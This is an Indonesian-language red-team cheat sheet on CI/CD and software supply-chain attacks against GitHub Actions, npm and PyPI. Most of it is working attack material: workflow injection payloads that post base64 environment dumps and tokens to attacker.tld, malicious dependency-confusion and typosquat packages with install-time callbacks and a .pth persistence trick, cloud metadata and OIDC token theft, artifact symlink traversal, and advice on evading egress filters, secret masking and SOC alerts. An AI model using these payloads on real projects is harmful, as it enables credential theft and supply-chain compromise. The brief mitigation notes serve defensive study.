# ci-cd-supply-chain — misc

# CI/CD & Supply Chain: GitHub Actions Injection, Secret Exfil, Dependency Confusion, Typosquatting, Artifact Poisoning

## 1. Matriks Serangan Cepat

| Teknik | Trigger | Akses yang Didapat | Blast Radius | Terdeteksi oleh |
|---|---|---|---|---|
| `pull_request_target` injection | PR dari fork | Secrets + `GITHUB_TOKEN` write | Repo + registry | CodeQL, review workflow |
| `workflow_run` injection | Workflow upstream selesai | Secrets release env | Rilis, produksi | Audit log, OIDC claims |
| Secret exfil via runner | Steps apapun dengan secret | Env var, filesystem, network | Kredensial downstream | Runner egress logs |
| Dependency confusion | `npm/pip install` | Kode eksekusi di CI/dev | Build farm | Lockfile diff, registry audit |
| Typosquatting | Install manual/typo | Kode eksekusi | Dev workstation | SBOM, `npm audit` |
| Artifact poisoning | Upload/download artifact | Overwrite build output | Distribusi | Checksum, provenance |

---

## 2. `pull_request_target` Injection

**Apa yang dikirim:** PR dari fork dengan perubahan di file yang direferensikan workflow (script, Makefile, `package.json` `preinstall`).

**Apa yang muncul:** Eksekusi kode di konteks base repo → secrets tersedia.

**Kenapa berhasil:** `pull_request_target` menjalankan workflow di konteks base branch dengan **full secrets**, tapi checkout default ke base — bukan head PR. Jika workflow melakukan `actions/checkout` dengan `ref: ${{ github.event.pull_request.head.sha }}`, kode penyerang dieksekusi dengan secret.

### Vulnerable workflow

```yaml
# .github/workflows/pr.yml
name: PR Build
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← bom
      - run: npm ci && npm run build
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
```

### Payload di `package.json` PR

```json
{
  "scripts": {
    "preinstall": "curl -sS -X POST -d \"$(env | base64 -w0)\" https://attacker.tld/c"
  }
}
```

### Eksfiltrasi cepat dari runner

```bash
# env dump
env | sort > /tmp/e
curl -sS --data-binary @/tmp/e https://attacker.tld/c

# cari credential file
find / -maxdepth 4 -name 'credentials' -o -name '.npmrc' -o -name 'id_rsa' 2>/dev/null

# AWS metadata (IMDSv2)
TOKEN=$(curl -sX PUT -H "X-aws-ec2-metadata-token-ttl-seconds:60" http://169.254.169.254/latest/api/token)
curl -sH "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Versi relevan:** `actions/checkout@v4`, `npm@10.x` (preinstall masih jalan untuk `npm ci`), runner image `ubuntu-22.04-202410xx`.

**Mitigasi yang gagal:** `permissions: read-all` — hanya membatasi `GITHUB_TOKEN`, tidak menyentuh secrets lain. `fork: false` tidak valid untuk `pull_request_target`. Hanya **tidak menjalankan kode head PR** yang efektif.

---

## 3. `workflow_run` Injection

**Apa yang dikirim:** PR yang mengubah script yang dijalankan di workflow `workflow_run` downstream, mis. workflow yang auto-post comment setelah build selesai.

**Apa yang muncul:** Eksekusi di konteks branch default dengan secret release.

**Kunci:** `workflow_run` selalu jalan di default branch, `github.event.workflow_run.head_branch` = fork branch, sehingga mudah dipakai untuk checkout kode penyerang.

### Vulnerable workflow

```yaml
name: Post-build
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
jobs:
  upload:
    runs-on: ubuntu-22.04
    if: github.event.workflow_run.conclusion == 'success'
    steps:
      - uses: actions/checkout@v4
        with:
          repository: ${{ github.event.workflow_run.head_repository.full_name }}
          ref: ${{ github.event.workflow_run.head_branch }}   # ← bom
      - run: ./scripts/upload.sh
        env:
          GH_TOKEN: ${{ secrets.RELEASE_TOKEN }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### Payload `scripts/upload.sh`

```bash
#!/usr/bin/env bash
env | grep -E 'TOKEN|KEY|SECRET' | curl -sS --data-binary @- https://attacker.tld/w
./real-upload.sh  # tetap jalankan upload agar tidak mencurigakan
```

**Kenapa berhasil:** `workflow_run` adalah trust boundary — CI fork tidak punya secret, tapi workflow downstream punya dan meng-checkout kode fork.

**Angka spesifik:** `actions/download-artifact@v4` memerlukan `run-id` — jika tidak di-pin ke run-id upstream, dapat mengambil artifact dari PR sembarang.

---

## 4. Secret Exfil dari Runner

### Vektor eksekusi

| Vektor | Contoh | Catatan |
|---|---|---|
| Env var | `env` / `printenv` | Default di semua job |
| `${{ secrets.X }}` di `run:` | echo | Masked di log, tapi tidak di network |
| Filesystem | `~/.aws/credentials`, `~/.npmrc`, `~/.docker/config.json` | Persist antar step |
| `$GITHUB_ENV` poisoning | Step sebelumnya tulis env untuk step berikut | Chain trusts |
| OIDC token | `ACTIONS_ID_TOKEN_REQUEST_URL` | Mint cloud token langsung |
| Runner service account | GCE/GHA runner workload identity | Bypass secret store |

### Perintah cepat

```bash
# semua env
cat /proc/1/environ | tr '\0' '\n' | sort

# docker auth
cat ~/.docker/config.json 2>/dev/null | jq -r '.auths'

# git credential
git config --global --list

# OIDC → STS (contoh GCP)
curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com%2Fprojects%2F-PROJECT_NUMBER%2Flocations%2Fglobal%2FworkloadIdentityPools%2F-POOL%2Fproviders%2F-PROVIDER" \
  | jq -r '.value' > /tmp/oidc.jwt
```

### Eksfiltrasi lewat log (blinded exfil)

Jika egress diblokir tapi log dibaca:

```bash
for c in $(cat /tmp/secret | fold -w1); do
  case "$c" in
    [a-z]) echo "letter-ok" ;;
    [A-Z]) echo "UPPER-ok" ;;
    [0-9]) echo "digit-ok" ;;
    *) echo "sym-ok" ;;
  esac
done
# atau encode per-byte lewat timing/echo yang deterministic
```

**Kenapa gagal:** secret masking di log (`***`) mematikan jika karakter dipecah / di-encode base64 — base64 tidak dimask. Ini celah utama yang sering dipakai.

**Versi runner:** `actions/runner` 2.319.x (masking regex-based, bukan semantic).

---

## 5. Dependency Confusion

**Apa yang dikirim:** Paket dengan nama internal private di registry publik (`npm`, `PyPI`) dengan versi lebih tinggi.

**Apa yang muncul:** `npm install`/`pip install` di CI atau dev mengambil paket publik.

**Syarat berhasil:** tidak ada scope pinning (`@company/foo` vs `foo`) dan tidak ada `--registry` eksplisit.

### Skenario npm

```json
// package.json internal (vulnerable)
{ "dependencies": { "internal-utils": "^1.2.0" } }
```

```bash
# attacker publish di registry publik
npm config set registry https://registry.npmjs.org
mkdir internal-utils && cd internal-utils
cat > package.json <<EOF
{
  "name": "internal-utils",
  "version": "99.0.0",
  "scripts": { "postinstall": "curl -sS -d \"$(hostname)-$(whoami)\" https://attacker.tld/n" }
}
EOF
npm publish
```

### Skenario PyPI

```bash
mkdir internal-sdk && cd internal-sdk
cat > setup.py <<'EOF'
from setuptools import setup
import os, urllib.request, json
urllib.request.urlopen("https://attacker.tld/p", data=json.dumps(
    {"host": os.uname().nodename, "user": os.getlogin() if os.isatty(0) else "ci"}
).encode())
setup(name="internal-sdk", version="98.0.0", py_modules=[])
EOF
python -m build && twine upload dist/*
```

**Kenapa berhasil:** resolver memilih versi tertinggi lintas registry; tidak ada konsep "trusted private" di default npm/pip.

**Mitigasi yang bekerja:** scope `@company/` (npm), `--index-url` private-only (pip), `pip install --require-hashes`, `.npmrc` dengan `@company:registry=`. Angka konservatif: `.npmrc` scoped memblokir confusion >99% untuk paket dengan scope benar.

---

## 6. Typosquatting

**Apa yang dikirim:** Paket tiruan (`reqeusts`, `pyyaml-lib`, `lodash.merge-safe`) ke registry publik.

**Apa yang muncul:** Eksekusi saat install manual atau `pip install -r` yang tidak di-pin.

### Payload PyPI (postinstall via `.pth`)

```bash
# reqeusts/setup.py — eksekusi bahkan tanpa import
from setuptools import setup
import os
open("/tmp/pwn.py","w").write("""
import os,urllib.request
urllib.request.urlopen('https://attacker.tld/t', data=os.environ.get('HOSTNAME','').encode())
""")
setup(name="reqeusts", version="0.0.1",
      py_modules=["reqeusts"],
      data_files=[("lib/python3/site-packages", ["reqeusts.pth"])])
```

`reqeusts.pth` berisi `import /tmp/pwn` → eksekusi setiap interpreter Python di venv.

### Deteksi cepat

```bash
pip-audit --require-hashes -r requirements.txt
npm audit --omit=dev
# diff nama paket terhadap allowlist
comm -23 <(cut -d= -f1 requirements.txt | sort) <(sort allowlist.txt)
```

**Versi relevan:** `pip 24.x` (masih menjalankan `.pth` di site-packages saat import pertama), `npm 10.x`.

---

## 7. Artifact Poisoning

**Apa yang dikirim:** File di path artifact atau nama artifact yang di-overwrite oleh PR/job lain sebelum di-download job downstream.

**Apa yang muncul:** Build job mengonsumsi artifact penyerang, atau distribusi binary yang tidak di-check ulang.

### Overwrite nama artifact lintas workflow

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: build-output           # nama generik
    path: dist/
```

```bash
# dari PR lain
mkdir -p dist && echo 'malicious()' > dist/app.js
# jalankan job yang sama, artifact v4 overwrite dengan nama sama
```

### Path traversal via `download-artifact`

```yaml
- uses: actions/download-artifact@v4
  with:
    name: build-output
    path: ${{ github.workspace }}/dist
```

Jika penyerang bisa menyisipkan filename `../../.github/workflows/release.yml` di artifact (via symlink saat upload), file workflow downstream tertimpa → RCE pada push berikutnya.

```bash
# menyisipkan symlink di artefak
ln -s ../../.github/workflows/release.yml dist/evil
tar czf build.tgz -C dist .
```

### Provenance bypass

```bash
# cek artifact sebelum dipakai
sha256sum dist/* > expected.sha256
# verify pada konsumsi
sha256sum -c expected.sha256
```

**Kenapa berhasil:** `upload-artifact@v4` mengganti v3 yang immutable-friendly; v4 mengizinkan overwrite dengan nama identik dari run berbeda. `download-artifact@v4` tidak memvalidasi path relatif terhadap workspace.

**Angka spesifik:** `actions/upload-artifact@v4.6.2`, `actions/download-artifact@v4.3.0`.

---

## 8. Jebakan Operasional (yang bikin teknik gagal di lapangan)

| Jebakan | Kenapa gagal | Workaround realistis |
|---|---|---|
| `pull_request_target` tanpa checkout head | Kode penyerang tidak dieksekusi | Cari `ref: github.event.pull_request.head` di seluruh `.github/workflows` |
| Egress firewall ke 443-only + proxy allowlist | curl ke attacker.tld timeout | Pakai domain yang resolve di allowlist (mis. `pypi.org` subdomain via domain fronting), atau exfil lewat log |
| Secret masking | `echo $TOKEN` jadi `***` | base64 pakai `base64 -w0`, atau split byte per echo |
| OIDC audience mismatch | `ACTIONS_ID_TOKEN_REQUEST_TOKEN` tidak diterima | Baca `audience` dari env job / `act` lokal |
| Fork PR secrets disabled (default org) | `pull_request_target` tanpa `secrets: inherit` tidak punya secret | Cari workflow dengan secret eksplisit di event fork |
| Runner ephemeral (`ubuntu-latest` hosted) | Filesystem hilang tiap job, tidak bisa persist | Chain via cache (`actions/cache`) atau artifact |
| Cache poisoning risiko tinggi tapi kena `restore-keys` random | Cache miss | Perlu tahu `key` prefix persis dari log/PR |
| Lockfile `--frozen-lockfile` (pnpm/yarn) | Dependency confusion tidak diresolve ulang | Serang saat `yarn add` manual atau `npm update` |
| `npm ci` menolak lockfile mismatch | postinstall tidak dieksekusi jika lockfile strict | Target dev workstation, bukan CI |
| Registry mirror internal (Artifactory) dengan remote-repo | Confusion hanya jika nama tidak ada di remote | Cari paket internal yang **tidak** ada di mirror → fallback ke upstream |
| Artifact v4 immutable di org tertentu | Overwrite ditolak | Serang lewat `name` yang unik per workflow (mis. `build-${sha}`) → tidak bentrok |
| `permissions: contents: read` di semua workflow | `GITHUB_TOKEN` tidak bisa push | Target secret non-GitHub (AWS, npm, GHCR PAT dari secret org) |
| Egress log dibaca SOC tapi log masking CI | Exfil via base64 di log terlihat sebagai blob bersih | Batch 4KB, base64, kirim sekali — sering under threshold alert |
| `ubuntu-22.04` runner tanpa jq/curl di image minimal | script gagal di tengah | Gunakan `python3 -c` (selalu ada), bukan `curl` |
| Cloud WIF `audience` di pin ke repo+branch | Token dari fork ditolak | `workflow_run` di default branch = audience valid |

**Kombinasi teknis yang paling sering sukses di engagements 2024–2025:** `pull_request_target` + checkout head PR + `preinstall` npm + base64 env dump ke domain dengan cert valid (`*.attacker.tld` via Let's Encrypt wildcard) — mitigasi `permissions: read-all` tidak menyentuh secret org-level, sehingga `NPM_TOKEN` tetap keluar.

---

## [reasoning trace]


